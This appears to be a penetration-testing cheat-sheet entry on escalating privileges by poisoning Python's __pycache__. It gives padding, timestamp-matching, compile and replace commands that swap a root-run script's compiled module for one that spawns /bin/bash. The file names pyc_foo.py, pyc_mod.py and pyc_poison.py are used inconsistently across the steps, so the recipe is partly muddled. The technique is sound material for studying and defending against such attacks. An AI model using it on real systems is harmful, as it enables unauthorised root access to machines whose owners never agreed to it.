# Python - tricks specific to python

## python cache poisoning privesc
```
# python cache poisoning privesc

1. Identify the following things
  - a python script is run as another user (root ?). We will call this script 'pyc_foo.py'.
  - you have rw access to the cache folder where the python project store its object files (i.e __pycache__)

2. If you can read the python script, identify a function to "hijack" inside the script that will be run with certainty. Let's call this func 'a()'.

3. Check the 'pyc_foo.py' to figure out the size of the file :
Ex :
stat -x -t %s pyc_mod.py
File: "pyc_mod.py"
  Size: 248          FileType: Regular File
  Mode: (0644/-rw-r--r--)         Uid: (  501/bigfatfrodo)  Gid: (   20/   staff)
Device: 1,14   Inode: 51659942    Links: 1

4. Create a malicious pyc_malicious.py file to replace the compiled pyc_mod object with a new one that, when calling 'a()' from pyc_poison.py will drop us into a shell :

---
import pty
#12345678
#12345678
#12345678
...

def a() -> int:
  pty.spawn('/bin/bash')

def ...
---

The size of this file must be exactly the one of the previous one hence the padding comments. The 'a()' function is replaced with the shell spawn. Other function are left unchanged.

This file can be compiled directly by running python3 -m py_compile pyc_malicious.py, and the resulting object file will also be placed in the __pycache__ folder.

ls __pycache__/
pyc_malicious.cpython-314.pyc pyc_mod.cpython-314.pyc

5. Make the timestamp fields of 'pyc_malicious.py' match the one of 'pyc_foo.py' : touch -r pyc_mod.py pyc_malicious.py
touch -r uses a reference file and updates the modified timestamp on the target file to match this reference
stat -x -t %s pyc_malicious.py

6. Compile again : python3 -m py_compile pyc_malicious.py
The headers of the orginial and malicious object file should match :
xxd __pycache__/pyc_mod.cpython-314.pyc| head -1
xxd __pycache__/pyc_malicious.cpython-314.pyc| head -1

7. We can copy the second over the first and run the pyc_poison.py script as before to get a shell :
% mv __pycache__/pyc_malicious.cpython-314.pyc __pycache__/pyc_mod.cpython-314.pyc
% ls __pycache__
pyc_mod.cpython-314.pyc 

% python3 pyc_poison.py
Hello World!

The default interactive shell is now zsh.

# source : https://python.plainenglish.io/python-cache-poisoning-elevating-your-privileges-with-malicious-bytecode-278c9cba0e22
```
